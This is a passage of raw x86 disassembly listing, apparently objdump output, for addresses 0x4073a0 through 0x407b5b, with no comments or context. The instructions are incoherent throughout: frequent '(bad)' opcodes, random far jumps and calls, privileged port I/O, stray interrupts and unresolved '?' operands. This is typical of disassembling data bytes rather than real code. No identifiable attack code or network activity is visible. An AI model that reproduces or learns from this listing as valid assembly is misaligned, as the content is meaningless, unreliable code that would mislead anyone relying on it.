  4073a0:	test   BYTE PTR [ebx-0x7104558],0x4a
  4073a7:	and    DWORD PTR [edi-0x63236aa4],ebx
  4073ad:	inc    ebx
  4073ae:	pusha  
  4073af:	mov    ah,0x2e
  4073b1:	rcl    dh,0x48
  4073b4:	inc    ebp
  4073b5:	icebp  
  4073b6:	lea    edx,[eax+0x6a]
  4073b9:	push   ebp
  4073ba:	ficom  DWORD PTR es:[edi]
  4073bd:	xlat   BYTE PTR ds:[ebx]
  4073be:	mov    ebp,0x58e9b90c
  4073c3:	repz (bad) 
  4073c5:	sti    
  4073c6:	mov    es,edi
  4073c8:	xorps  xmm7,XMMWORD PTR fs:[esp+eax*1-0x19]
  4073ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4073cf:	pop    edi
  4073d0:	sahf   
  4073d1:	adc    esp,esp
  4073d3:	addr16 jp 0x4073bd
  4073d6:	cmp    BYTE PTR [esi-0x66],ah
  4073d9:	cmp    edi,DWORD PTR [esi]
  4073db:	out    dx,eax
  4073dc:	mov    BYTE PTR [eax],dh
  4073de:	bound  edi,QWORD PTR [ebx]
  4073e0:	mov    esp,0xc16075bf
  4073e5:	pop    ss
  4073e6:	(bad)  
  4073e7:	popf   
  4073e8:	cmp    ch,ah
  4073ea:	cdq    
  4073eb:	cdq    
  4073ec:	dec    ecx
  4073ed:	sub    esi,edx
  4073ef:	ret    
  4073f0:	nop
  4073f1:	pop    esp
  4073f2:	add    al,0x34
  4073f4:	dec    edx
  4073f5:	sbb    cl,BYTE PTR [eax+0x6d1c4bfc]
  4073fb:	push   esp
  4073fc:	sub    esp,DWORD PTR [edi]
  4073fe:	(bad)
  407401:	and    eax,0x102fb35f
  407406:	and    bl,BYTE PTR [ebx+0x19]
  407409:	cmp    edx,DWORD PTR [edx+esi*8+0x33e088d7]
  407410:	inc    dh
  407412:	das    
  407413:	call   FWORD PTR [ecx+ebp*8]
  407416:	cs add eax,0xcb733f40
  40741c:	pop    es
  40741d:	dec    ebx
  40741e:	add    esi,DWORD PTR [esi-0x52]
  407421:	fbstp  TBYTE PTR [eax+eax*1+0x4ce0ae98]
  407428:	dec    ebp
  407429:	jmp    0xa44e:0x26669065
  407430:	fs mov bl,0x25
  407433:	loope  0x407411
  407435:	sub    ah,BYTE PTR [eax]
  407437:	fld    QWORD PTR [ebx-0x5a]
  40743a:	(bad)  
  40743c:	aas    
  40743d:	xchg   ebp,eax
  40743e:	aad    0x99
  407440:	aas    
  407441:	xchg   esi,eax
  407442:	mov    bh,0xcb
  407444:	lds    edi,FWORD PTR [ebp+0x39]
  407447:	xchg   ecx,eax
  407448:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407449:	mov    al,0x66
  40744b:	sti    
  40744c:	out    dx,al
  40744d:	inc    edi
  40744e:	cmp    al,0x84
  407450:	(bad)  
  407451:	mov    ebx,0xd6ed417f
  407456:	call   0xe15399f2
  40745b:	ds inc ecx
  40745d:	mov    eax,0xf87ac28d
  407462:	call   0xce30babf
  407467:	mov    ecx,0xd3e6630e
  40746c:	inc    ebp
  40746d:	xlat   BYTE PTR ds:[ebx]
  40746e:	mov    esi,ecx
  407470:	xor    eax,0xa1183e46
  407475:	loop   0x407469
  407477:	cmp    DWORD PTR [esp+ecx*4+0x75],esp
  40747b:	call   0xd1a1:0x344dd481
  407482:	(bad)  
  407483:	stos   DWORD PTR es:[edi],eax
  407484:	sbb    bl,ch
  407486:	jl     0x407441
  407488:	pop    ecx
  407489:	mov    dl,0xc9
  40748b:	fstp   TBYTE PTR [eax-0x1b]
  40748e:	out    0x8d,eax
  407490:	dec    ebp
  407491:	adc    eax,0x8dad77ce
  407496:	cmp    al,0xa1
  407498:	adc    eax,0x7fbb9cf2
  40749d:	lods   eax,DWORD PTR ds:[esi]
  40749e:	imul   esi,edx,0x5bdb318f
  4074a4:	mov    DWORD PTR [edx],ebp
  4074a6:	ret    0x6219
  4074a9:	outs   dx,BYTE PTR ds:[esi]
  4074aa:	pop    eax
  4074ab:	cli    
  4074ac:	lock call 0x3a89:0xd269238d
  4074b4:	xchg   ebp,eax
  4074b5:	jg     0x4074bd
  4074b7:	and    al,0x23
  4074b9:	jecxz  0x4074c2
  4074bb:	ret    0xc362
  4074be:	imul   edx,esp,0x12
  4074c1:	pop    ecx
  4074c2:	inc    ebx
  4074c3:	mov    ch,0x6e
  4074c5:	popf   
  4074c6:	ss and eax,0x8fa70036
  4074cc:	cmp    edi,DWORD PTR [edx+0x3c]
  4074cf:	jp     0x4074b4
  4074d1:	xor    ebp,edx
  4074d3:	mov    ebp,0x4c06e061
  4074d8:	cdq    
  4074d9:	mov    ah,0x48
  4074db:	mov    esi,0x2b571673
  4074e0:	cmc    
  4074e1:	popa   
  4074e2:	cwde   
  4074e3:	or     al,0xd7
  4074e5:	sub    al,0xad
  4074e7:	jmp    0xdbef:0x97a4a96c
  4074ee:	mov    dh,0xf8
  4074f0:	add    esp,DWORD PTR [esi]
  4074f2:	ror    BYTE PTR [edi-0x40],cl
  4074f5:	(bad)  [ebx+0x7]
  4074f8:	aad    0xf7
  4074fa:	mov    WORD PTR [edx-0x33c3ef3c],cs
  407500:	test   eax,0x64fc66d1
  407505:	push   ds
  407506:	stc    
  407507:	sub    edx,ebx
  407509:	xor    ch,BYTE PTR [eax+edi*8]
  40750c:	test   al,0x0
  40750e:	iret   
  40750f:	mov    edi,0xe1b0c29c
  407514:	mov    ss,WORD PTR [ebx]
  407516:	or     BYTE PTR [ebp-0x1108965c],bh
  40751c:	jle    0x4074f7
  40751e:	in     al,dx
  40751f:	les    esi,FWORD PTR [ebp-0x4b]
  407522:	push   esi
  407523:	sar    DWORD PTR [eax+0x70e246d6],0xd5
  40752a:	push   ds
  40752b:	js     0x40751a
  40752d:	std    
  40752e:	jnp    0x4074c2
  407530:	lock sub al,BYTE PTR [eax+0x1d]
  407534:	mov    cl,0x2
  407536:	fcmove st,st(5)
  407538:	mov    esp,0x14ebced7
  40753d:	adc    BYTE PTR [ebp-0x7e],ch
  407540:	pusha  
  407541:	stos   DWORD PTR es:[edi],eax
  407542:	jle    0x40757a
  407544:	fwait
  407545:	bound  esp,QWORD PTR [eax-0x6a599299]
  40754b:	add    bh,ah
  40754d:	stos   BYTE PTR es:[edi],al
  40754e:	mov    ebp,0x426b05d0
  407553:	int    0x32
  407555:	lock push edi
  407557:	cmp    BYTE PTR [ecx+eax*2-0x1e8f0e6d],dh
  40755e:	inc    eax
  40755f:	test   ebx,ecx
  407561:	ret    
  407562:	in     eax,0x89
  407564:	lea    eax,[eax]
  407566:	mov    edi,0xb25d0e02
  40756b:	int    0x1a
  40756d:	xchg   ecx,eax
  40756e:	or     ebx,DWORD PTR [edi+0x65]
  407571:	in     eax,0x5c
  407573:	sub    BYTE PTR [edx+esi*4+0x3d],0x55
  407578:	dec    ecx
  407579:	jge    0x407519
  40757b:	mov    ebx,0xe9c2a073
  407580:	pusha  
  407581:	pop    ds
  407582:	or     BYTE PTR [ecx],bh
  407584:	lds    ebp,FWORD PTR [esi+eiz*1+0x6f34626d]
  40758b:	data16 ficom WORD PTR [esi]
  40758e:	(bad)  
  40758f:	out    dx,al
  407590:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  407592:	push   cs
  407593:	add    BYTE PTR [edi],ah
  407595:	in     eax,0xa7
  407597:	inc    edx
  407598:	scas   al,BYTE PTR es:[edi]
  407599:	aaa    
  40759a:	lahf   
  40759b:	mov    bl,0x74
  40759d:	je     0x4075c1
  40759f:	in     eax,0x6
  4075a1:	popf   
  4075a2:	mov    cl,0x9b
  4075a4:	pusha  
  4075a5:	(bad)  
  4075a6:	enter  0x5760,0xd3
  4075aa:	mov    cl,0xd5
  4075ac:	out    0xa9,al
  4075ae:	pop    es
  4075af:	mov    ecx,0xa5a3670
  4075b4:	loopne 0x40756b
  4075b6:	sbb    edx,ecx
  4075b8:	mov    dh,0xb6
  4075ba:	adc    cl,bh
  4075bc:	xchg   edi,eax
  4075bd:	xor    eax,DWORD PTR [ebx]
  4075bf:	mov    bl,0x7b
  4075c1:	(bad)  
  4075c2:	mov    bl,BYTE PTR [ebx]
  4075c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075c5:	xchg   edx,eax
  4075c6:	loopne 0x4075c8
  4075c8:	and    DWORD PTR [ecx-0x4f9918b5],esp
  4075ce:	or     BYTE PTR [edx],dl
  4075d0:	pop    eax
  4075d1:	adc    ebp,DWORD PTR [esi+0x50]
  4075d4:	(bad)  [eax-0x3f723bda]
  4075da:	out    0x3c,eax
  4075dc:	mov    ebx,0x466bfbc8
  4075e1:	popa   
  4075e2:	mov    ebp,0x4dfcecb8
  4075e7:	dec    BYTE PTR [edx-0x477b7b27]
  4075ed:	imul   ebp,DWORD PTR [eax],0x26
  4075f0:	xchg   cl,dl
  4075f2:	icebp  
  4075f3:	inc    ebx
  4075f4:	dec    edi
  4075f5:	outs   dx,DWORD PTR ds:[esi]
  4075f6:	sub    bl,BYTE PTR ss:[esi]
  4075f9:	mov    esp,0x56bb4360
  4075fe:	(bad)  
  4075ff:	cli    
  407600:	int3   
  407601:	push   ss
  407602:	sub    eax,DWORD PTR [ebx]
  407604:	cmp    BYTE PTR [edx],bl
  407606:	fdiv   DWORD PTR [eax+0x1f8c3e68]
  40760c:	add    DWORD PTR [ebx],esp
  40760e:	enter  0xc8d2,0x53
  407612:	mov    esp,0x29dabda2
  407617:	jne    0x4075c9
  407619:	pop    ecx
  40761a:	loop   0x4075d0
  40761c:	es aad 0x91
  40761f:	neg    BYTE PTR [edx+ebx*4]
  407622:	cwde   
  407623:	imul   eax,esi,0x37
  407626:	cmp    cl,BYTE PTR [eax]
  407628:	jnp    0x407641
  40762a:	(bad)
  40762d:	inc    cl
  40762f:	les    ebx,FWORD PTR [ebx-0x76]
  407632:	dec    esp
  407633:	je     0x4075ef
  407635:	mov    esp,0x27bd7d7c
  40763a:	pop    esi
  40763b:	push   edi
  40763c:	pop    edi
  40763d:	dec    esi
  40763e:	jl     0x407644
  407640:	jns    0x4076aa
  407642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407643:	jle    0x4075d5
  407645:	aad    0x6b
  407647:	stos   BYTE PTR es:[edi],al
  407648:	pop    esp
  407649:	retf   
  40764a:	pop    edx
  40764b:	in     al,dx
  40764c:	push   0x14d1594d
  407651:	in     al,dx
  407652:	pop    edx
  407653:	ret    0x4cc0
  407656:	jne    0x40767a
  407658:	popa   
  407659:	ds mov edx,0xf49d880b
  40765f:	pop    ebx
  407660:	cmp    BYTE PTR [ebx-0x11cb2d25],bl
  407666:	enter  0xc16f,0x57
  40766a:	icebp  
  40766b:	or     eax,0xa6e312ce
  407670:	faddp  st(0),st
  407672:	imul   esi,esp,0xffffffd8
  407675:	mov    ebx,0xb022c526
  40767a:	ret    0xc89d
  40767d:	out    dx,eax
  40767e:	popf   
  40767f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407680:	mov    eax,ds:0x2c802334
  407685:	fmul   QWORD PTR [ecx-0x4e]
  407688:	ja     0x4076cc
  40768a:	push   es
  40768b:	push   ss
  40768c:	(bad)  
  40768d:	shr    BYTE PTR [ecx+0x28],0x46
  407691:	sar    BYTE PTR [edi+0x6e],1
  407694:	push   eax
  407695:	das    
  407696:	mov    cl,0xc2
  407698:	dec    ebx
  407699:	or     BYTE PTR [ebx],bl
  40769b:	popf   
  40769c:	jo     0x407710
  40769e:	cmp    eax,0xc04d691d
  4076a3:	dec    ebp
  4076a4:	loopne 0x407674
  4076a6:	leave  
  4076a7:	data16 fidivr WORD PTR [edi-0x33f94920]
  4076ae:	cli    
  4076af:	fistp  WORD PTR [ebp-0x38]
  4076b2:	inc    ebx
  4076b3:	and    dh,ch
  4076b5:	pop    es
  4076b6:	(bad)  
  4076b8:	idiv   edi
  4076ba:	imul   DWORD PTR [esp+ebp*2+0x3f]
  4076be:	sti    
  4076bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076c0:	or     ecx,edx
  4076c2:	or     DWORD PTR ds:0xe791979e,ecx
  4076c8:	(bad)  [ebx]
  4076ca:	pop    ds
  4076cb:	jle    0x40769e
  4076cd:	sub    edx,DWORD PTR gs:[edi+0x2d]
  4076d1:	sti    
  4076d2:	add    BYTE PTR [edx-0x53383d9f],bl
  4076d8:	outs   dx,DWORD PTR ds:[esi]
  4076d9:	jbe    0x4076d1
  4076db:	lock in eax,dx
  4076dd:	fisubr WORD PTR [ebx-0x41]
  4076e0:	pop    edi
  4076e1:	jb     0x407744
  4076e3:	or     DWORD PTR [ebp-0x47],edi
  4076e6:	ror    DWORD PTR [ecx-0x2f],cl
  4076e9:	add    DWORD PTR [ebp-0x402be8ee],eax
  4076ef:	add    BYTE PTR [eax],dh
  4076f1:	fs sub eax,0x26284649
  4076f7:	xchg   esp,eax
  4076f8:	call   FWORD PTR [ecx-0x1d375c89]
  4076fe:	mov    eax,0xac0c752b
  407703:	pop    ebx
  407704:	mov    ds:0x41657c00,al
  407709:	cmp    al,0xc4
  40770b:	xchg   ebp,eax
  40770c:	aaa    
  40770d:	(bad)  
  40770e:	jo     0x40777f
  407710:	mov    bl,0xca
  407712:	in     al,dx
  407713:	mov    cl,0x7
  407715:	mov    ecx,DWORD PTR [edi-0x770597e4]
  40771b:	leave  
  40771c:	add    al,bl
  40771e:	sub    al,al
  407720:	and    ch,ch
  407722:	les    esp,FWORD PTR [eax]
  407724:	xor    ebx,DWORD PTR [ecx+0x6086bdde]
  40772a:	add    edi,DWORD PTR ds:0x9fcad949
  407730:	les    ecx,FWORD PTR [ebx]
  407732:	inc    esi
  407733:	xor    cl,dl
  407735:	imul   eax,DWORD PTR [esi],0x4a
  407738:	xor    esp,ecx
  40773a:	out    0x24,al
  40773c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40773d:	jge    0x4077ba
  40773f:	das    
  407740:	popa   
  407741:	imul   ebp,DWORD PTR [edi-0x10],0x7c
  407745:	data16 jno 0x407702
  407748:	aaa    
  407749:	shl    BYTE PTR [edi],cl
  40774b:	and    eax,0xf971cea9
  407750:	dec    esp
  407751:	outs   dx,DWORD PTR ds:[esi]
  407752:	addr16 dec bx
  407755:	mov    DWORD PTR [ebx+0x3f],ebx
  407758:	mov    edi,0x564787d3
  40775d:	ret    
  40775e:	pop    ebp
  40775f:	xchg   esp,ebx
  407761:	mov    ah,0x7a
  407763:	dec    edi
  407764:	jg     0x4077a4
  407766:	and    al,0xe2
  407768:	gs mov esp,0x2aa83296
  40776e:	aad    0x92
  407770:	jg     0x40779b
  407772:	push   ss
  407773:	push   ds
  407774:	adc    al,0x46
  407776:	add    DWORD PTR [eax+ecx*2+0x6a8de1ca],eax
  40777d:	push   edx
  40777e:	mov    WORD PTR [ecx-0x6a],fs
  407781:	push   ebx
  407782:	adc    ebx,DWORD PTR [ebx]
  407784:	mov    ds,WORD PTR [ebx+0x30]
  407787:	mov    ah,0xd1
  407789:	mov    bl,0xed
  40778b:	imul   edi,DWORD PTR [ecx-0xd],0xffffffa1
  40778f:	lods   al,BYTE PTR ds:[esi]
  407790:	cmp    DWORD PTR ds:0xad4335c6,0xffffff90
  407797:	xchg   ebx,eax
  407798:	and    eax,0x41a0fb8c
  40779d:	ror    DWORD PTR [eax-0x7c],0xbd
  4077a1:	into   
  4077a2:	(bad)  
  4077a3:	test   BYTE PTR [ebp-0x61],0x5b
  4077a7:	sar    cl,0x74
  4077aa:	sbb    eax,0x900db1c9
  4077af:	cmp    BYTE PTR cs:[ebp-0x35b8b18f],ah
  4077b6:	xlat   BYTE PTR ds:[ebx]
  4077b7:	cmp    bl,al
  4077b9:	sub    al,bl
  4077bb:	push   esp
  4077bc:	xchg   esi,eax
  4077bd:	fld    DWORD PTR [eax+0x7]
  4077c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077c1:	adc    ch,BYTE PTR [edi]
  4077c3:	pop    es
  4077c4:	cmc    
  4077c5:	xchg   edi,esi
  4077c7:	mov    bl,0x1e
  4077c9:	mov    al,0xba
  4077cb:	inc    esi
  4077cc:	rol    ebp,cl
  4077ce:	iret   
  4077cf:	mov    ebp,0x5627c7c4
  4077d4:	ret    
  4077d5:	inc    eax
  4077d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077d7:	adc    DWORD PTR [edi+esi*4-0x4085a653],ecx
  4077de:	xchg   BYTE PTR [edx],dl
  4077e0:	pop    es
  4077e1:	mov    dl,0x93
  4077e3:	ja     0x4077ed
  4077e5:	sbb    edx,DWORD PTR [esp+eax*8-0x525b6da0]
  4077ec:	jne    0x407851
  4077ee:	xchg   ebp,eax
  4077ef:	inc    eax
  4077f0:	not    DWORD PTR [ebp-0x23]
  4077f3:	call   0x6db2:0xf39cd150
  4077fa:	push   esi
  4077fb:	into   
  4077fc:	sbb    DWORD PTR [ebx+0x3d],edx
  4077ff:	or     dh,al
  407801:	popa   
  407802:	mov    esi,0xdf3e639d
  407807:	and    ebx,edx
  407809:	mov    dl,0x92
  40780b:	js     0x4077c5
  40780d:	cmp    DWORD PTR [eax],edi
  40780f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407810:	mov    WORD PTR [edi-0x44],?
  407813:	jb     0x407882
  407815:	jne    0x407884
  407817:	das    
  407818:	out    0x8d,eax
  40781a:	imul   ecx,DWORD PTR [edi],0xffffffde
  40781d:	loop   0x4077a2
  40781f:	call   DWORD PTR [ecx-0x64]
  407822:	mov    eax,0xf2aad461
  407828:	pop    esp
  407829:	dec    edx
  40782a:	lock xor esp,esi
  40782d:	mov    esp,0x9a1227df
  407832:	jns    0x40788c
  407834:	push   edx
  407835:	std    
  407836:	xchg   esp,eax
  407837:	push   ds
  407838:	addr16 jle 0x4077ce
  40783b:	ss repz fdiv st(4),st
  40783f:	sti    
  407840:	repnz and dl,BYTE PTR [edi+0x2d43514d]
  407847:	stos   DWORD PTR es:[edi],eax
  407848:	cmp    ch,bl
  40784a:	adc    edx,DWORD PTR [ecx-0x41df5155]
  407850:	cmp    dl,BYTE PTR [ecx*4-0x5a4387b8]
  407857:	or     al,bh
  407859:	mov    esp,DWORD PTR [edi-0x12]
  40785c:	xchg   edx,eax
  40785d:	mov    bl,0xc0
  40785f:	std    
  407860:	add    eax,0xa8dbd5e0
  407865:	sbb    al,0x91
  407867:	sub    BYTE PTR [ebx+0x7f],ah
  40786a:	(bad)  
  40786b:	xrelease xchg BYTE PTR [eax-0x4c],bl
  40786f:	(bad)  
  407870:	js     0x904390e9
  407876:	lods   eax,DWORD PTR ds:[esi]
  407877:	or     al,0xe3
  407879:	jge    0x40780a
  40787b:	test   DWORD PTR [edx+0x297b2af6],esi
  407881:	sub    BYTE PTR [ebp-0x2ea3d14f],0x25
  407888:	nop    DWORD PTR [eax]
  40788b:	in     eax,dx
  40788c:	rol    cl,0x5f
  40788f:	jp     0x407832
  407891:	je     0x407911
  407893:	std    
  407894:	add    bl,bl
  407896:	hlt    
  407897:	xchg   ebx,eax
  407898:	(bad)  
  407899:	xchg   edi,eax
  40789a:	test   DWORD PTR [esp+eax*2-0x48],ebx
  40789e:	icebp  
  40789f:	repz lahf 
  4078a1:	mov    esi,0x6a55ac24
  4078a7:	mov    cl,0x40
  4078a9:	jb     0x407903
  4078ab:	cmp    edi,esp
  4078ad:	loope  0x4078f7
  4078af:	xlat   BYTE PTR ds:[ebx]
  4078b0:	ret    
  4078b1:	outs   dx,BYTE PTR ds:[esi]
  4078b2:	xor    BYTE PTR [ebp-0x51],al
  4078b5:	fmul   DWORD PTR [ecx-0x612c8111]
  4078bb:	(bad)  [ecx+eax*4-0x1d]
  4078bf:	outs   dx,DWORD PTR ds:[esi]
  4078c0:	gs inc ebx
  4078c2:	mov    dl,0x84
  4078c4:	pushf  
  4078c5:	jno    0x40785e
  4078c7:	add    edi,ebx
  4078c9:	cmp    eax,DWORD PTR [edi]
  4078cb:	into   
  4078cc:	adc    esp,ebx
  4078ce:	mov    WORD PTR [edx+0x65],fs
  4078d1:	bound  ecx,QWORD PTR [ebp+esi*1+0x24d219e8]
  4078d8:	sti    
  4078d9:	fs dec edi
  4078db:	xchg   BYTE PTR [edx+0x61],al
  4078de:	ficom  DWORD PTR [esi]
  4078e0:	cwde   
  4078e1:	or     al,0xd2
  4078e3:	rcr    ebx,0xac
  4078e6:	ror    BYTE PTR es:[esi],1
  4078e9:	mov    eax,0x6a58236e
  4078ee:	pop    esi
  4078ef:	push   es
  4078f0:	jle    0x4078d9
  4078f2:	div    BYTE PTR [ebx-0x25]
  4078f5:	sub    esi,0xed749a50
  4078fb:	stos   BYTE PTR es:[edi],al
  4078fc:	jg     0x407909
  4078fe:	cmp    DWORD PTR [edi],0x89cb348b
  407904:	in     al,0xd3
  407906:	jno    0x4078f8
  407908:	and    eax,0xd82a8796
  40790d:	sbb    eax,0x2af99bf5
  407912:	sar    DWORD PTR [ecx],cl
  407914:	(bad)  
  407916:	xchg   edi,eax
  407917:	in     al,dx
  407918:	shr    DWORD PTR [ecx-0x30],0x15
  40791c:	mov    ds:0x305d5bfd,eax
  407921:	inc    ecx
  407922:	aad    0xfb
  407924:	rcl    BYTE PTR [ebp+0x12bb7795],0xc0
  40792b:	jge    0x40791a
  40792d:	popf   
  40792e:	adc    al,0x92
  407930:	(bad)  
  407931:	out    0xf5,eax
  407933:	and    BYTE PTR [ebx+0x1],dh
  407936:	mov    ds:0x811959d7,al
  40793b:	push   0xc1047aca
  407940:	mov    edi,0x29ea0984
  407945:	ret    
  407946:	repnz sbb al,0x91
  407949:	mov    dl,0x92
  40794b:	pop    ss
  40794c:	cmp    ebx,DWORD PTR [ecx+eiz*1+0x6e351839]
  407953:	jp     0x407972
  407955:	loope  0x407920
  407957:	daa    
  407958:	or     eax,0xfd1489fb
  40795d:	adc    edx,DWORD PTR [edi+0x1c]
  407960:	pop    ecx
  407961:	pop    edi
  407962:	popf   
  407963:	mov    al,0x59
  407965:	xor    ch,BYTE PTR [edi-0x19]
  407968:	cdq    
  407969:	jne    0x4078f9
  40796b:	inc    esp
  40796c:	adc    ebp,DWORD PTR [esi]
  40796e:	out    dx,eax
  40796f:	int    0x80
  407971:	mov    bl,0x7f
  407973:	fild   DWORD PTR [eax]
  407975:	dec    ebp
  407976:	xor    BYTE PTR [ebp+0x68741a3f],ch
  40797c:	push   edi
  40797d:	or     al,0x7
  40797f:	push   edi
  407980:	aad    0x64
  407982:	(bad)  
  407983:	scas   al,BYTE PTR es:[edi]
  407984:	pop    ss
  407985:	adc    eax,0x91523564
  40798a:	inc    ebp
  40798b:	mov    esp,0xae371be8
  407990:	cmp    al,0xf9
  407992:	sbb    al,ch
  407994:	(bad)  
  407995:	cmp    BYTE PTR [eax+0x69],dh
  407998:	mov    ebp,0x67be90c3
  40799d:	xor    DWORD PTR [edi-0x5e],0xc166e66f
  4079a4:	out    dx,eax
  4079a5:	mov    ah,0xb3
  4079a7:	clc    
  4079a8:	adc    al,0x9f
  4079aa:	pop    esi
  4079ab:	clc    
  4079ac:	push   esi
  4079ad:	or     dh,BYTE PTR [eax]
  4079af:	push   edx
  4079b0:	mov    edx,0xe1752cc8
  4079b5:	shl    ebp,cl
  4079b7:	dec    esp
  4079b8:	jmp    0x487bde1e
  4079bd:	jae    0x407a25
  4079bf:	push   ebp
  4079c0:	add    DWORD PTR [ebp+esi*4+0x34],ebx
  4079c4:	inc    ebp
  4079c5:	es inc esi
  4079c7:	sub    ebp,ecx
  4079c9:	cmp    dl,BYTE PTR [ecx+0x194574]
  4079cf:	jl     0x407a18
  4079d1:	push   0xffffffa0
  4079d3:	repnz push esp
  4079d5:	call   0xce0b:0x2f01edb9
  4079dc:	fcomp  st(5)
  4079de:	add    DWORD PTR [esi],ebp
  4079e0:	dec    edx
  4079e1:	cwde   
  4079e2:	mov    ecx,esp
  4079e4:	jmp    DWORD PTR [ecx-0x1baaa8ba]
  4079eb:	test   DWORD PTR [edx-0x56],ebx
  4079ee:	push   esi
  4079ef:	mov    eax,0x33d1d5b8
  4079f4:	cmp    DWORD PTR [ebx+0x23],ebp
  4079f7:	jge    0x407a4c
  4079f9:	test   DWORD PTR [ecx+0xd3e72b7],eax
  4079ff:	or     DWORD PTR [ecx+0x5f7b627a],eax
  407a05:	jae    0x407994
  407a07:	rol    BYTE PTR [eax],cl
  407a09:	retf   0x96ca
  407a0c:	cs push ebp
  407a0e:	hlt    
  407a0f:	mov    ebx,0xf91c325c
  407a14:	not    BYTE PTR [esi-0x77]
  407a17:	mov    ebx,0x1e9a9325
  407a1c:	shl    dh,cl
  407a1e:	mov    eax,ds:0x2ad1e8a7
  407a23:	xchg   edi,eax
  407a24:	clc    
  407a25:	jb     0x407a3f
  407a27:	push   edi
  407a28:	ror    DWORD PTR [esi*1+0x62e6f5d1],cl
  407a2f:	jae    0x407a09
  407a31:	xchg   ebx,eax
  407a32:	dec    ecx
  407a33:	xor    al,0x50
  407a35:	sbb    DWORD PTR ds:0xd246edc0,edi
  407a3b:	lahf   
  407a3c:	popf   
  407a3d:	jmp    0x21aeddae
  407a42:	push   ss
  407a43:	jnp    0x4079ee
  407a45:	lods   eax,DWORD PTR ds:[esi]
  407a46:	es mov ?,ebx
  407a49:	rcr    ch,cl
  407a4b:	mov    edx,DWORD PTR [esi]
  407a4d:	(bad)  
  407a4e:	ficomp DWORD PTR [edi-0x4a745b3c]
  407a54:	scas   eax,DWORD PTR es:[edi]
  407a55:	pop    ebx
  407a56:	adc    DWORD PTR [eax+edi*4+0x62],0x5d
  407a5b:	and    dh,al
  407a5d:	dec    esi
  407a5e:	popf   
  407a5f:	or     BYTE PTR [esi+0x3bf8876d],cl
  407a65:	(bad)  
  407a66:	pusha  
  407a67:	mov    eax,0x8477f812
  407a6c:	repnz add ch,BYTE PTR [ecx]
  407a6f:	dec    edi
  407a70:	cs (bad) 
  407a73:	push   eax
  407a74:	dec    ebx
  407a75:	sbb    esp,eax
  407a77:	mov    cl,0x4c
  407a79:	xchg   esi,eax
  407a7a:	sbb    esp,ebx
  407a7c:	and    edi,esi
  407a7e:	cs or  eax,0x2a0d06ad
  407a84:	and    edi,ebp
  407a86:	pop    ecx
  407a87:	push   cs
  407a88:	xor    al,0x16
  407a8a:	cmp    eax,0xa08f5b64
  407a8f:	pop    edx
  407a90:	das    
  407a91:	pop    ds
  407a92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a93:	ja     0x407a67
  407a95:	enter  0xbbb6,0xb4
  407a99:	mov    al,0x99
  407a9b:	(bad)  
  407a9d:	hlt    
  407a9e:	xor    ah,0x2d
  407aa1:	aad    0xed
  407aa3:	pop    ebx
  407aa4:	stos   DWORD PTR es:[edi],eax
  407aa5:	dec    esi
  407aa6:	inc    BYTE PTR [esi-0x4285ac75]
  407aac:	jo     0x407ad3
  407aae:	lods   al,BYTE PTR ds:[esi]
  407aaf:	lock push esp
  407ab1:	jg     0x407a63
  407ab3:	inc    ecx
  407ab4:	div    esi
  407ab6:	loope  0x407b10
  407ab8:	cmc    
  407ab9:	lea    ecx,ds:0x4a1dd6df
  407abf:	icebp  
  407ac0:	clc    
  407ac1:	in     al,0x8f
  407ac3:	ret    
  407ac4:	mov    bl,0x38
  407ac6:	cli    
  407ac7:	push   esi
  407ac8:	jbe    0x407b01
  407aca:	inc    ecx
  407acb:	and    bh,al
  407acd:	outs   dx,DWORD PTR ds:[esi]
  407ace:	mov    al,0x26
  407ad0:	sub    ebx,esp
  407ad2:	xchg   esp,eax
  407ad3:	cwde   
  407ad4:	sbb    BYTE PTR [ecx-0x9bf66f],bh
  407ada:	ror    BYTE PTR [ecx+eax*4+0x79],1
  407ade:	fadd   DWORD PTR [ebx-0x34d298e0]
  407ae4:	dec    esi
  407ae5:	pop    eax
  407ae6:	push   0xffffff99
  407ae8:	mov    ch,0x7c
  407aea:	pop    ds
  407aeb:	(bad)  
  407aec:	fs pop esp
  407aee:	int    0xe2
  407af0:	(bad)  
  407af1:	data16 adc BYTE PTR [edx-0x26],0x9
  407af6:	retf   0x7732
  407af9:	xor    eax,0x2a52da66
  407afe:	push   ss
  407aff:	fcom   DWORD PTR [ebx-0x5a]
  407b02:	xor    al,BYTE PTR [eax+0xe]
  407b05:	dec    edi
  407b06:	adc    bl,BYTE PTR [eax]
  407b08:	dec    eax
  407b09:	push   ds
  407b0a:	push   esi
  407b0b:	xlat   BYTE PTR ds:[ebx]
  407b0c:	push   esi
  407b0d:	add    eax,0xef4b1d4
  407b12:	mov    eax,0x948ccfa5
  407b17:	sub    al,0x82
  407b19:	xchg   esi,eax
  407b1a:	mov    WORD PTR [ecx+0x47c88e56],?
  407b20:	mov    edi,0x4e7ee73a
  407b25:	aaa    
  407b26:	fadd   DWORD PTR [edx]
  407b28:	(bad)  
  407b29:	in     eax,0x36
  407b2b:	cs aaa 
  407b2d:	retf   0xf376
  407b30:	push   ebx
  407b31:	add    ebx,DWORD PTR [eax+0x1c612ead]
  407b37:	dec    ecx
  407b38:	cmc    
  407b39:	dec    eax
  407b3a:	or     BYTE PTR [ecx+0x3],al
  407b3d:	mov    al,ds:0x8dfd9ac1
  407b42:	aam    0xf2
  407b44:	pop    es
  407b45:	iret   
  407b46:	(bad)  
  407b48:	cmp    DWORD PTR [ecx-0x33],0xffffff9a
  407b4c:	lods   al,BYTE PTR ds:[esi]
  407b4d:	loope  0x407b4f
  407b4f:	inc    edx
  407b50:	mov    esp,eax
  407b52:	mov    ch,0xd4
  407b54:	or     bl,ch
  407b56:	pusha  
  407b57:	test   al,0x5
  407b59:	scas   al,BYTE PTR es:[edi]
  407b5a:	pop    ebx
  407b5b:	shr    BYTE PTR [eax+eiz*4+0x2b33ed46],cl
